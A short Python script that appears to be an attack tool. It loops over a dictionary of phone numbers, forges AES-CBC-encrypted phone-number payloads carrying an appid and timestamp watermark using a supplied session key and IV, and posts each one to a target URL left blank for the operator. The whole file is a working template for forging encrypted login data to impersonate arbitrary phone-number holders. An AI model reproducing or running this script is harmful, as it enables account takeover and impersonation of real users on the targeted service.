from Crypto.Cipher import AES
import base64
import json
from urllib.parse import quote
import urllib3
import requests
import concurrent.futures


def encrypt_aes_cbc(plaintext, session_key, iv):
    aes = AES.new(base64.b64decode(session_key), AES.MODE_CBC, base64.b64decode(iv))
    padded_plaintext = _pad(plaintext.encode('utf-8'))
    ciphertext = aes.encrypt(padded_plaintext)
    encoded_ciphertext = base64.b64encode(ciphertext).decode('utf-8')
    return quote(encoded_ciphertext, safe='')


def _pad(text):
    block_size = AES.block_size
    padding_size = block_size - len(text) % block_size
    padding = padding_size * chr(padding_size).encode('utf-8')
    return text + padding


def verify(param):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    headers = {
        #enter your headers
    }
    url = '' #enter your url
    try:
        req = requests.post(url=url, data=param, headers=headers)
        print(req.text)
    except Exception as e:
        print(f"Error in request: {e}")


def main():
    session_key = ""
    iv = ""

    # Read data from file 1.txt which is the phonenumber dictionary
    with open('1.txt', 'r') as file:
        lines = file.readlines()

    # Create plaintext dictionary
    plaintext = {
        "phoneNumber": "",  #empyt
        "purePhoneNumber": "",  #empyt
        "countryCode": "",  #enter your countryCode
        "watermark": {
            "timestamp": "",    #enter your timestamp
            "appid": "" #enter your appid
        }
    }

    # Function to process each line
    def process_line(line):
        line = line.strip()  # Remove newline characters
        plaintext["phoneNumber"] = line
        plaintext["purePhoneNumber"] = line

        # Encrypt the plaintext
        plaintext_str = json.dumps(plaintext, separators=(',', ':'))
        encrypted_data = encrypt_aes_cbc(plaintext_str, session_key, iv)
        print(f"Encrypted data for {line}: {encrypted_data}")
        # Send request and wait for response
        verify(encrypted_data)

    # Create a ThreadPoolExecutor with max_workers=1
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
        # Submit each line to the executor for sequential processing
        futures = [executor.submit(process_line, line) for line in lines]

        # Wait for all tasks to complete
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()  # Ensure all tasks complete sequentially
            except Exception as e:
                print(f"Exception occurred: {e}")


if __name__ == "__main__":
    main()
